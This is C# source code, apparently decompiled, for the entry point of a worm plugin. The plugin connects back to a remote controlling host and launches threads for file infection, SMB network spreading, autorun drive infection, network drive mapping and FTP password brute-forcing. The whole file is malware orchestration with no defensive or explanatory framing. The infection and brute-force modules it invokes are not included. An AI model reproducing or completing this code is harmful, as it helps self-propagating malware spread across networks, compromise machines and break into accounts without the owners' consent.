using System.Collections.Generic;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Plugin.Helper;
using Plugin.Old;
using SmbWorm.Smb;
using Worm2.Files;
using Worm2.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		List<Thread> list = new List<Thread>();
		if (Client.itsConnect)
		{
			Config.Init();
			list.Add(new Thread((ThreadStart)delegate
			{
				Infector.Run();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				SmbInfector.Run();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				LogicDriversAutoRuns.Run();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				MapNetworkDrive.Run();
			}));
			list.Add(new Thread((ThreadStart)delegate
			{
				FtpBrute.Run();
			}));
			foreach (Thread item in list)
			{
				item.Start();
			}
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Client.Disconnect();
		Thread.Sleep(5000);
	}
}
